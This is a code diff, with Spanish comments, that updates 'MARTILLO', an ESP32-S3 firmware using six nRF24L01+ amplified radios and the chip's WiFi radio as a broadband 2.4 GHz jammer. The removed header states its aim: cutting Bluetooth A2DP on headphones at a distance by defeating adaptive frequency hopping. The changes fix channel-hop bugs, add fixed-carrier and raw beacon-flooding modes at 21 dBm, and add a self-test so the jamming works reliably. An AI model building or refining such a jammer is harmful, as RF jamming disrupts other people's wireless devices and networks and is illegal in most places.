@@ -1,38 +1,25 @@
 /*
- * MARTILLO v10.0 — ESP32-S3 N16R8 — ESP-IDF 6.0.3
- * 6x nRF24L01+ PA/LNA (carpa GFSK) + radio WiFi del S3 (bloque 802.11 de 20 MHz)
+ * MARTILLO v10.1 — ESP32-S3 N16R8 — ESP-IDF 6.0.3
+ * 6x nRF24L01+ PA/LNA + radio WiFi del S3 (bloque 802.11 de 20 MHz)
  *
  * SPI2 (SCK 12, MOSI 11, MISO 13): NRF1(CE 4 CS 10) NRF2(CE 5 CS 9) NRF3(CE 6 CS 14)
  * SPI3 (SCK 18, MOSI 8,  MISO 7):  NRF4(CE 1 CS 21) NRF5(CE 15 CS 16) NRF6(CE 17 CS 38)
  * WS2812 -> GPIO 48
  *
- * ===== POR QUE ESTE DISEÑO =====
- * Objetivo: A2DP contra audifonos caros a varios metros. El enemigo no es el
- * hop rate de 1600/s, es AFH: remapea en ~1 s y excluye lo que oye sucio.
- * BT Core 5.4 Vol 2 Part B 4.5 exige >=20 canales buenos. Debajo de eso AFH
- * se queda sin mapa y el enlace no se sostiene.
- *
- * 6 x nRF24 a 2 Mbps GFSK = 12 MHz de 79. Solo, no alcanza. Por eso:
- *   - 6 radios en carpa: 13-14 canales por radio, dwell 450us con jitter,
- *     orden barajado, payload LFSR, TX_REUSE. ~100% de duty, 0 ventanas de
- *     silencio, 0 escaneo.
- *   - Radio WiFi del S3: tramas beacon 802.11 crudas de ~168 B a 1 Mbps
- *     (preamble largo) sobre 20 MHz. Rota 1 -> 6 -> 11 cada 150 ms para que
- *     AFH no pueda asentar un mapa estable.
- *
- * ===== POR QUE 2 Mbps Y NO CW =====
- * 2 Mbps GFSK ocupa ~2 MHz y el preamble del nRF24 es 0x55 alternado, igual
- * que el preamble de BT BR. Al demodulador del audifono le llega algo que
- * PARECE trama valida: se pone a correlacionar el access code y falla. Un CW
- * es un tono de decenas de kHz, filtrable, y encima obliga a dwell largo.
- *
- * ===== LIMITES FISICOS ASUMIDOS =====
- * - PLL lock 130us (Nordic PS Tabla 16): dwell 450us da 71% de portadora
- *   estable, el resto es chirp de relock (que tambien jamea, es broadband).
- * - RFX2401C: 120-170 mA de pico por modulo. AMS1117 por modulo, 470uF de
- *   bulk, 10uF+100nF en el header. Nunca del regulador del devkit.
- * - GPIO 35/36/37 son PSRAM octal: no se tocan.
- * - Antenas >=7 cm de separacion, polarizacion alternada.
+ * ===== CORRECCIONES v10.1 =====
+ * 1) CE conmutado POR SALTO + re-arme de TX_REUSE. En v10.0 CE quedaba alto
+ *    para siempre con TX_REUSE puesto: el sintetizador no volvia a idle y el
+ *    RF_CH escrito podia no aplicarse -> 6 radios clavados, AFH los esquiva.
+ *    Ahora: ce_lo -> RF_CH -> TX_REUSE=1 -> ce_hi -> dwell. Coste ~3us (0.7%).
+ * 2) WiFi INLINE en el lazo de jam_b. v10.0 lo puso en un task a prio 22 y el
+ *    driver WiFi (prio 23) dejaba sin CPU a jam_b y al monitor. Ahora no hay
+ *    task competidora: el frame se inyecta dentro del mismo lazo.
+ * 3) AP en vez de STA para esp_wifi_80211_tx (el AP es dueño del beacon).
+ * 4) Settle de 2 ms tras PWR_UP antes de subir CE (datasheet: 1.5 ms).
+ * 5) AUTOTEST de RF al arranque con RPD cruzado: te dice en el monitor si
+ *    algun modulo esta sordo, antes de que confies en el barrido.
+ * 6) MODO 1 = CW fijo en 6 canales separados. Si con esto no calla un audifono
+ *    a 10 cm, el problema es alimentacion/antena, no firmware.
  */
 
 #include <stdio.h>
@@ -57,23 +44,26 @@
 static const char *TAG = "MART";
 
 /* ===================== CONFIG ===================== */
+#define MODO             0        /* 0 = carpa + WiFi   1 = CW fijo (prueba) */
 #define CH_LO            2
 #define CH_HI            80
-#define NUM_CANALES      (CH_HI - CH_LO + 1)     /* 79, BT Classic 2402-2480 */
+#define NUM_CANALES      (CH_HI - CH_LO + 1)
 #define NUM_RADIOS       6
 
-#define DWELL_US         450u     /* > 130us de PLL; ~2.7 tramas de 168us */
-#define JITTER_US        150u     /* rompe el peine, AFH no predice */
+#define DWELL_US         450u
+#define JITTER_US        150u
+#define REFRESCO_HOPS    96u
 
-#define REFRESCO_HOPS    96u      /* recarga de payload pseudoaleatorio */
-
-#define CON_WIFI         1        /* radio WiFi del S3 como 3er TX */
-#define WIFI_MS_POR_CANAL 150     /* rotacion 1 -> 6 -> 11 */
-#define WIFI_FRAMES_POR_TICK 1
+#define CON_WIFI         1
+#define WIFI_MS_POR_CANAL 150
+#define WIFI_CADA_HOPS   24       /* inyecta 1 frame 802.11 cada 24 saltos */
 
 #define SPI_HZ           (16 * 1000 * 1000)
 #define CPU_MHZ          240u
 #define CEDE_MS          2000
+
+/* canales del modo prueba: bien separados */
+static const uint8_t CW_FIJO[6] = {2, 16, 30, 44, 58, 72};
 
 /* ===================== tiempo / RNG ===================== */
 static inline __attribute__((always_inline)) uint32_t cyc(void) {
@@ -88,7 +78,7 @@ static inline IRAM_ATTR uint32_t rnd(void) {
 
 /* ===================== LED ===================== */
 #define LED_GPIO GPIO_NUM_48
-#define LED_B   40
+#define LED_B    40
 static led_strip_handle_t led;
 static void led_set(uint8_t r, uint8_t g, uint8_t b) {
     led_strip_set_pixel(led, 0, r, g, b);
@@ -113,10 +103,9 @@ static void led_set(uint8_t r, uint8_t g, uint8_t b) {
 #define CMD_W_TX_PAYLOAD 0xA0
 #define CMD_FLUSH_TX     0xE1
 
-/* 0x0F = RF_DR_HIGH (2 Mbps) | RF_PWR 11 (0 dBm). OJO: 0x0E = -6 dBm. */
-#define RF_SETUP_STORM   0x0F
+#define RF_SETUP_STORM   0x0F     /* 2 Mbps | RF_PWR 11 (0 dBm). 0x0E = -6 dBm */
 #define RF_SETUP_CW      (0x0F | (1u<<7) | (1u<<4))
-#define CONFIG_TX        0x72   /* PWR_UP, PRIM_RX=0, sin CRC, IRQ enmascaradas */
+#define CONFIG_TX        0x72
 #define CONFIG_RX        0x73
 #define TX_REUSE         (1u<<6)
 
@@ -128,7 +117,7 @@ typedef struct {
     spi_device_handle_t spi;
     spi_dev_t *hw;
     uint8_t  seq[24];
-    uint8_t  len, idx;
+    uint8_t  len, idx, align;
     volatile uint32_t hops;
     bool bang_ok, bang_sucio, vivo;
 } radio_t;
@@ -150,7 +139,6 @@ static radio_t radios[NUM_RADIOS] = {
 
 static volatile int g_vivos = 0;
 
-/* GPIO 0..31 -> W1TS/W1TC ; 32..48 -> OUT1_* */
 #define GPIO_OUT_W1TS  (*(volatile uint32_t *)0x60004008u)
 #define GPIO_OUT_W1TC  (*(volatile uint32_t *)0x6000400Cu)
 #define GPIO_OUT1_W1TS (*(volatile uint32_t *)0x60004014u)
@@ -177,10 +165,9 @@ static inline void cs_hi(radio_t *r) {
 static inline spi_dev_t *spi_hw(spi_host_device_t h) {
     return (h == SPI2_HOST) ? &GPSPI2 : &GPSPI3;
 }
-static uint8_t g_bang_align = 0;
-#define BANG_W(c,v) (g_bang_align == 0 ? (((uint32_t)(c)<<24)|((uint32_t)(v)<<16)) : \
-                    g_bang_align == 1 ? (((uint32_t)(c)<<8)|(uint32_t)(v))         : \
-                                        (((uint32_t)(c))|((uint32_t)(v)<<8)))
+#define BANG_W(r,c,v) ((r)->align == 0 ? (((uint32_t)(c)<<24)|((uint32_t)(v)<<16)) : \
+                       (r)->align == 1 ? (((uint32_t)(c)<<8)|(uint32_t)(v))         : \
+                                         (((uint32_t)(c))|((uint32_t)(v)<<8)))
 
 static void IRAM_ATTR bang_arm(radio_t *r) {
     spi_dev_t *hw = r->hw;
@@ -197,7 +184,7 @@ static inline IRAM_ATTR void bang_write(radio_t *r, uint8_t cmd, uint8_t val) {
     if (r->bang_sucio) { bang_arm(r); r->bang_sucio = false; }
     spi_dev_t *hw = r->hw;
     cs_lo(r);
-    hw->data_buf[0] = BANG_W(cmd, val);
+    hw->data_buf[0] = BANG_W(r, cmd, val);
     hw->cmd.usr = 1;
     uint32_t g = 100000;
     while (hw->cmd.usr && --g) { }
@@ -239,7 +226,7 @@ static void nrf_payload(radio_t *r, const uint8_t *b, int n) {
     marcar_sucio(r->host);
 }
 
-/* ===================== init radios ===================== */
+/* ===================== init ===================== */
 static void bus_init(spi_host_device_t h, gpio_num_t sck, gpio_num_t mosi, gpio_num_t miso) {
     spi_bus_config_t b = {
         .mosi_io_num = mosi, .miso_io_num = miso, .sclk_io_num = sck,
@@ -294,8 +281,6 @@ static void payload_fresco(radio_t *r) {
 }
 
 static void storm_enter(radio_t *r) {
-    /* direccion de 5 B: junto con el preamble 0x55 imita la estructura de
-     * access code de BT BR lo suficiente para que el demod intente y falle */
     const uint8_t dir[5] = {0xA7, 0x3C, 0x91, 0x5E, 0xD2};
     ce_lo(r);
     nrf_cmd(r, CMD_FLUSH_TX);
@@ -306,17 +291,69 @@ static void storm_enter(radio_t *r) {
     nrf_write_reg(r, NRF_RF_SETUP, RF_SETUP_STORM);
     nrf_write_multi(r, NRF_TX_ADDR, dir, 5);
     nrf_write_reg(r, NRF_CONFIG, CONFIG_TX);
+    vTaskDelay(pdMS_TO_TICKS(2));       /* PWR_UP: 1.5 ms de settle */
     payload_fresco(r);
 }
 
 static void bang_detectar(radio_t *r) {
     for (int a = 0; a < 3; a++) {
-        g_bang_align = (uint8_t)a;
+        r->align = (uint8_t)a;
         r->hw = spi_hw(r->host);
         bang_write(r, CMD_W_REGISTER | NRF_RF_CH, 0x2A);
         if (nrf_read_reg(r, NRF_RF_CH) == 0x2A) { r->bang_ok = true; return; }
     }
     r->bang_ok = false;
+    ESP_LOGW(TAG, "%s BANG NO, uso driver", r->nombre);
+}
+
+/* ===================== autotest RF ===================== */
+static void autotest_rf(void) {
+    int vivos[NUM_RADIOS], nv = 0;
+    for (int i = 0; i < NUM_RADIOS; i++) if (radios[i].vivo) vivos[nv++] = i;
+    if (nv < 2) { ESP_LOGW(TAG, "AUTOTEST: hacen falta 2 radios"); return; }
+
+    int ok_cnt = 0;
+    for (int k = 0; k < nv; k++) {
+        radio_t *a = &radios[vivos[k]];
+        radio_t *b = &radios[vivos[(k + 1) % nv]];
+
+        ce_lo(b);
+        nrf_write_reg(b, NRF_RF_SETUP, RF_SETUP_STORM);
+        nrf_write_reg(b, NRF_EN_RXADDR, 0x01);
+        nrf_write_reg(b, NRF_RF_CH, 50);
+        nrf_write_reg(b, NRF_CONFIG, CONFIG_RX);
+        ce_hi(b);
+
+        ce_lo(a);
+        nrf_write_reg(a, NRF_RF_CH, 50);
+        nrf_write_reg(a, NRF_RF_SETUP, RF_SETUP_CW);
+        ce_hi(a);
+
+        esp_rom_delay_us(500);
+        uint8_t rpd = nrf_read_reg(b, NRF_RPD) & 1;
+        if (rpd) ok_cnt++;
+
+        ce_lo(a);
+        nrf_write_reg(a, NRF_RF_SETUP, RF_SETUP_STORM);
+        ce_hi(a);
+        ce_lo(b);
+        nrf_write_reg(b, NRF_EN_RXADDR, 0x00);
+        nrf_write_reg(b, NRF_CONFIG, CONFIG_TX);
+        nrf_write_reg(b, NRF_RF_SETUP, RF_SETUP_STORM);
+        ce_hi(b);
+
+        ESP_LOGI(TAG, "AUTOTEST %s -> %s : RPD=%d %s",
+                 a->nombre, b->nombre, rpd, rpd ? "TX OK" : "SIN SENAL");
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+    for (int i = 0; i < NUM_RADIOS; i++) if (radios[i].vivo) payload_fresco(&radios[i]);
+
+    if (ok_cnt == 0)
+        ESP_LOGE(TAG, "AUTOTEST: NINGUN enlace. Revisa 3.3 V, GND comun y antenas.");
+    else if (ok_cnt < nv)
+        ESP_LOGW(TAG, "AUTOTEST: %d/%d enlaces. Hay modulos sordos.", ok_cnt, nv);
+    else
+        ESP_LOGI(TAG, "AUTOTEST: %d/%d enlaces, RF viva.", ok_cnt, nv);
 }
 
 /* ===================== reparto ===================== */
@@ -324,16 +361,23 @@ static void repartir(void) {
     int vivos[NUM_RADIOS], nv = 0;
     for (int i = 0; i < NUM_RADIOS; i++) if (radios[i].vivo) vivos[nv++] = i;
     if (!nv) return;
-
     for (int i = 0; i < NUM_RADIOS; i++) radios[i].len = 0;
 
+#if MODO == 1
+    for (int k = 0; k < nv; k++) {
+        radio_t *r = &radios[vivos[k]];
+        r->seq[0] = CW_FIJO[k % 6];
+        r->len = 1;
+        nrf_write_reg(r, NRF_RF_CH, r->seq[0]);
+    }
+    ESP_LOGI(TAG, "MODO PRUEBA: %d radios en CW fijo", nv);
+#else
     int k = 0;
     for (int c = CH_LO; c <= CH_HI; c++) {
         radio_t *r = &radios[vivos[k % nv]];
         if (r->len < sizeof(r->seq)) r->seq[r->len++] = (uint8_t)c;
         k++;
     }
-    /* Fisher-Yates: orden barajado, nada de rampa monotona */
     for (int i = 0; i < nv; i++) {
         radio_t *r = &radios[vivos[i]];
         for (int j = r->len - 1; j > 0; j--) {
@@ -342,6 +386,7 @@ static void repartir(void) {
         }
     }
     ESP_LOGI(TAG, "Reparto: %d canales en %d radios", NUM_CANALES, nv);
+#endif
 }
 
 /* ===================== hop ===================== */
@@ -350,8 +395,13 @@ static inline IRAM_ATTR void hop(radio_t *r) {
     r->idx++;
     if (r->idx >= r->len) r->idx = 0;
     uint8_t ch = r->seq[r->idx];
+
+    ce_lo(r);                                     /* FIX: fuerza re-aplicar canal */
     if (r->bang_ok) bang_write(r, CMD_W_REGISTER | NRF_RF_CH, ch);
     else            nrf_write_reg(r, NRF_RF_CH, ch);
+    nrf_write_reg(r, NRF_FIFO_STATUS, TX_REUSE);  /* FIX: CE bajo limpia TX_REUSE */
+    ce_hi(r);
+
     r->hops++;
     if (!(r->hops % REFRESCO_HOPS)) payload_fresco(r);
 }
@@ -368,22 +418,24 @@ static inline IRAM_ATTR uint32_t dwell_jit(void) {
 static const uint8_t WIFI_CANALES[] = {1, 6, 11};
 static uint8_t beacon[200];
 static int beacon_len = 0;
+static volatile bool g_wifi_ok = false;
+static volatile uint32_t g_wifi_err = 0;
 
 static void beacon_build(void) {
     static const uint8_t mac[6] = {0x02, 0x4A, 0x41, 0x4D, 0x00, 0x01};
     uint8_t *p = beacon;
-    *p++ = 0x80; *p++ = 0x00;              /* FC: beacon */
-    *p++ = 0x00; *p++ = 0x00;              /* duration */
-    for (int i = 0; i < 6; i++) *p++ = 0xFF;   /* DA broadcast */
-    for (int i = 0; i < 6; i++) *p++ = mac[i]; /* SA */
-    for (int i = 0; i < 6; i++) *p++ = mac[i]; /* BSSID */
-    *p++ = 0x00; *p++ = 0x00;              /* seq (la reescribe el driver) */
-    for (int i = 0; i < 8; i++) *p++ = 0x00;   /* timestamp */
-    *p++ = 0x64; *p++ = 0x00;              /* interval 100 TU */
-    *p++ = 0x31; *p++ = 0x04;              /* capability */
-    *p++ = 0x00; *p++ = 0x20;              /* SSID IE, 32 B */
+    *p++ = 0x80; *p++ = 0x00;
+    *p++ = 0x00; *p++ = 0x00;
+    for (int i = 0; i < 6; i++) *p++ = 0xFF;
+    for (int i = 0; i < 6; i++) *p++ = mac[i];
+    for (int i = 0; i < 6; i++) *p++ = mac[i];
+    *p++ = 0x00; *p++ = 0x00;
+    for (int i = 0; i < 8; i++) *p++ = 0x00;
+    *p++ = 0x64; *p++ = 0x00;
+    *p++ = 0x31; *p++ = 0x04;
+    *p++ = 0x00; *p++ = 0x20;
     for (int i = 0; i < 32; i++) *p++ = (uint8_t)('A' + (i % 26));
-    *p++ = 0xDD; *p++ = 0x60;              /* vendor IE 96 B: mas airtime */
+    *p++ = 0xDD; *p++ = 0x60;
     *p++ = 0x00; *p++ = 0x50; *p++ = 0xF2;
     for (int i = 0; i < 0x5D; i++) *p++ = (uint8_t)rnd();
     beacon_len = (int)(p - beacon);
@@ -395,87 +447,109 @@ static bool wifi_arrancar(void) {
         nvs_flash_erase();
         e = nvs_flash_init();
     }
-    if (e != ESP_OK) return false;
+    if (e != ESP_OK) { ESP_LOGE(TAG, "NVS: %s", esp_err_to_name(e)); return false; }
 
     ESP_ERROR_CHECK(esp_netif_init());
     ESP_ERROR_CHECK(esp_event_loop_create_default());
-    esp_netif_create_default_wifi_sta();
+    esp_netif_create_default_wifi_ap();
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     if (esp_wifi_init(&cfg) != ESP_OK) return false;
-    esp_wifi_set_mode(WIFI_MODE_STA);
+
+    wifi_config_t ap = {0};
+    memcpy(ap.ap.ssid, "MARTILLO", 8);
+    ap.ap.ssid_len = 8;
+    ap.ap.channel = 1;
+    ap.ap.max_connection = 1;
+    ap.ap.authmode = WIFI_AUTH_OPEN;
+    ap.ap.beacon_interval = 100;
+
+    esp_wifi_set_mode(WIFI_MODE_AP);
+    esp_wifi_set_config(WIFI_IF_AP, &ap);
     esp_wifi_set_storage(WIFI_STORAGE_RAM);
-    esp_wifi_start();
-    esp_wifi_set_ps(WIFI_PS_NONE);          /* sin ahorro: no queremos latencia */
-    esp_wifi_set_max_tx_power(84);          /* 84 * 0.25 dBm = 21 dBm */
+    if (esp_wifi_start() != ESP_OK) return false;
+    esp_wifi_set_ps(WIFI_PS_NONE);
+    esp_wifi_set_max_tx_power(84);   /* 84 * 0.25 = 21 dBm */
     esp_wifi_set_channel(WIFI_CANALES[0], WIFI_SECOND_CHAN_NONE);
 
     beacon_build();
-    ESP_LOGI(TAG, "WiFi TX listo: beacon %d B, rotando 1/6/11 cada %d ms",
+    ESP_LOGI(TAG, "WiFi TX (AP) listo: beacon %d B, rotando 1/6/11 cada %d ms",
              beacon_len, WIFI_MS_POR_CANAL);
     return true;
 }
 
-static void IRAM_ATTR wifi_task(void *arg) {
-    int idx = 0;
-    int64_t t_canal = esp_timer_get_time();
-    for (;;) {
-        if (esp_timer_get_time() - t_canal >= (int64_t)WIFI_MS_POR_CANAL * 1000) {
-            t_canal = esp_timer_get_time();
-            idx = (idx + 1) % 3;
-            esp_wifi_set_channel(WIFI_CANALES[idx], WIFI_SECOND_CHAN_NONE);
-        }
-        for (int i = 0; i < WIFI_FRAMES_POR_TICK; i++)
-            esp_wifi_80211_tx(WIFI_IF_STA, beacon, beacon_len, true);
-        vTaskDelay(1);                      /* el driver hace backpressure solo */
+/* llamada desde el lazo de jam_b: no hay task competidora */
+static inline void wifi_pulso(void) {
+    static int idx = 0;
+    static int64_t t_canal = 0;
+    if (!g_wifi_ok) return;
+    int64_t now = esp_timer_get_time();
+    if (!t_canal) t_canal = now;
+    if (now - t_canal >= (int64_t)WIFI_MS_POR_CANAL * 1000) {
+        t_canal = now;
+        idx = (idx + 1) % 3;
+        esp_wifi_set_channel(WIFI_CANALES[idx], WIFI_SECOND_CHAN_NONE);
     }
+    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, beacon, beacon_len, true);
+    if (e != ESP_OK && (g_wifi_err % 200) == 0)
+        ESP_LOGW(TAG, "80211_tx: %s (err #%lu)", esp_err_to_name(e),
+                 (unsigned long)g_wifi_err);
+    if (e != ESP_OK) g_wifi_err++;
 }
 #endif
 
-/* ===================== tasks jam ===================== */
-static void IRAM_ATTR jam_a(void *arg) {      /* core 1: radios 0-2 */
-    int64_t t = esp_timer_get_time();
+/* ===================== tasks ===================== */
+static void stats_y_led(uint32_t *prev, int64_t *tp, uint32_t *cont, bool wifi) {
+    int64_t n = esp_timer_get_time();
+    uint32_t sum = 0;
+    for (int i = 0; i < NUM_RADIOS; i++) {
+        if (!radios[i].vivo) continue;
+        sum += radios[i].hops - prev[i];
+        prev[i] = radios[i].hops;
+    }
+    uint32_t hz = (uint32_t)((uint64_t)sum * 1000000ull / (uint64_t)(n - *tp));
+    *tp = n;
+    ESP_LOGI(TAG, "vivos=%d hops/s=%lu (%.1f/radio) revisita=%.2f ms%s",
+             g_vivos, (unsigned long)hz, g_vivos ? (double)hz / g_vivos : 0.0,
+             hz ? 1000.0 * g_vivos / (double)hz : 0.0,
+             wifi ? " +WiFi" : "");
+#if CON_WIFI
+    if (wifi && g_wifi_err) {
+        ESP_LOGW(TAG, "80211_tx errores acumulados: %lu", (unsigned long)g_wifi_err);
+        g_wifi_err = 0;
+    }
+#endif
+    led_set(0, LED_B, 0); vTaskDelay(pdMS_TO_TICKS(20)); led_set(0, 0, 0);
+    *cont = 0;
+}
+
+static void jam_a(void *arg) {
+    uint32_t prev[NUM_RADIOS] = {0};
+    int64_t t = esp_timer_get_time(), tp = t;
+    uint32_t cont = 0;
     for (;;) {
         uint32_t c0 = cyc();
         hop(&radios[0]); hop(&radios[1]); hop(&radios[2]);
         uint32_t d = dwell_jit();
         while (cyc() - c0 < d) { }
-        int64_t n = esp_timer_get_time();
-        if (n - t >= (int64_t)CEDE_MS * 1000) { t = n; vTaskDelay(1); }
-    }
-}
-static void IRAM_ATTR jam_b(void *arg) {      /* core 0: radios 3-5 */
-    int64_t t = esp_timer_get_time();
-    for (;;) {
-        uint32_t c0 = cyc();
-        hop(&radios[3]); hop(&radios[4]); hop(&radios[5]);
-        uint32_t d = dwell_jit();
-        while (cyc() - c0 < d) { }
-        int64_t n = esp_timer_get_time();
-        if (n - t >= (int64_t)CEDE_MS * 1000) { t = n; vTaskDelay(1); }
+        if (++cont >= (CEDE_MS * 1000u) / DWELL_US) stats_y_led(prev, &tp, &cont, false);
     }
 }
 
-/* ===================== monitor ===================== */
-static void monitor(void *arg) {
+static void jam_b(void *arg) {
     uint32_t prev[NUM_RADIOS] = {0};
-    int64_t tp = esp_timer_get_time();
+    int64_t t = esp_timer_get_time(), tp = t;
+    uint32_t cont = 0;
     for (;;) {
-        vTaskDelay(pdMS_TO_TICKS(2000));
-        int64_t n = esp_timer_get_time();
-        uint32_t sum = 0;
-        for (int i = 0; i < NUM_RADIOS; i++) {
-            if (!radios[i].vivo) continue;
-            sum += radios[i].hops - prev[i];
-            prev[i] = radios[i].hops;
-        }
-        uint32_t hz = (uint32_t)((uint64_t)sum * 1000000ull / (uint64_t)(n - tp));
-        tp = n;
-        ESP_LOGI(TAG, "vivos=%d hops/s=%lu (%.1f/radio) revisita=%.2f ms",
-                 g_vivos, (unsigned long)hz,
-                 g_vivos ? (double)hz / g_vivos : 0.0,
-                 hz ? 1000.0 * g_vivos / (double)hz : 0.0);
-        led_set(0, LED_B, 0); vTaskDelay(pdMS_TO_TICKS(20)); led_set(0, 0, 0);
+        uint32_t c0 = cyc();
+        hop(&radios[3]); hop(&radios[4]); hop(&radios[5]);
+#if CON_WIFI
+        static uint32_t wc = 0;
+        if (++wc >= WIFI_CADA_HOPS) { wc = 0; wifi_pulso(); }
+#endif
+        uint32_t d = dwell_jit();
+        while (cyc() - c0 < d) { }
+        if (++cont >= (CEDE_MS * 1000u) / DWELL_US) stats_y_led(prev, &tp, &cont, true);
     }
 }
 
@@ -515,26 +589,21 @@ void app_main(void) {
         bang_detectar(&radios[i]);
         radios[i].bang_sucio = true;
     }
+    autotest_rf();
     repartir();
 
-#if CON_WIFI
-    bool wifi_ok = wifi_arrancar();
+#if CON_WIFI && MODO != 1
+    g_wifi_ok = wifi_arrancar();
 #else
-    bool wifi_ok = false;
+    g_wifi_ok = false;
 #endif
 
     led_set(0, 40, 0);
-    ESP_LOGI(TAG, "MARTILLO v10.0 · %d/6 nRF · dwell=%u+/-%u · WiFi=%s · RF_SETUP=0x%02X",
-             act, (unsigned)DWELL_US, (unsigned)JITTER_US,
-             wifi_ok ? "ON (20MHz rotando)" : "OFF", RF_SETUP_STORM);
+    ESP_LOGI(TAG, "MARTILLO v10.1 · %d/6 · MODO=%d · dwell=%u+/-%u · WiFi=%s",
+             act, MODO, (unsigned)DWELL_US, (unsigned)JITTER_US,
+             g_wifi_ok ? "ON" : "OFF");
 
-    xTaskCreatePinnedToCore(jam_a, "ja", 4096, NULL, configMAX_PRIORITIES - 3, NULL, 1);
-    xTaskCreatePinnedToCore(jam_b, "jb", 4096, NULL, configMAX_PRIORITIES - 3, NULL, 0);
-#if CON_WIFI
-    if (wifi_ok)
-        xTaskCreatePinnedToCore(wifi_task, "wf", 4096, NULL, configMAX_PRIORITIES - 2, NULL, 0);
-#endif
-    xTaskCreatePinnedToCore(monitor, "mon", 3072, NULL, 1, NULL, 0);
-
+    xTaskCreatePinnedToCore(jam_a, "ja", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 1);
+    xTaskCreatePinnedToCore(jam_b, "jb", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 0);
     vTaskDelay(portMAX_DELAY);
 }
